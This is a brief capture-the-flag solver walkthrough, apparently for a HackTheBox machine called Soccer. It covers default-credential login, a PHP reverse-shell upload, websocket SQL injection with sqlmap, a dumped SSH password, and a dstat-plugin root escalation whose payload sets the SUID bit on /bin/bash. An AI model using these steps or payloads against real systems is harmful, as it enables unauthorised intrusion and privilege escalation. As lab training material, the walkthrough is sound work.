## Solver
```
Port 80 Up
dirsearch found /tiny
use default credential of tiny file manager on exploitdb (Tiny RCE <= 2.4.6)
admin:admin@123
upload reverse shell php file to tiny folder
got RCE
web server is nginx
check latest edited file with ls -lat
check sites-available folder
found subdomain soc-player.htb
sql injection over websocket coz just have feature check ticket
using this script https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
modify the data
and run the ws.py
check if websocket is running workly with curl -XGET "http://localhost:8081/?id=1"
got response ticket doesnt exist
run sqlmap to local websocket url
got db soccer_db, table accounts
got creds
player@player.htb:PlayerOftheMatch2022
use password for ssh player@soccer.htb
got user player
got user.txt
check suid & gid file found doas
check doas.conf
doas can run dstat as root
dstat have plugins
plugins folder is writeable /usr/local/share/dstat
create plugins with script python named dstat_privesc.py
dstat_privesc.py contains import os;os.system("chmod u+s /bin/bash")
run /usr/local/bin/doas -u root /usr/bin/dstat --privesc &>/dev/null
got root
```
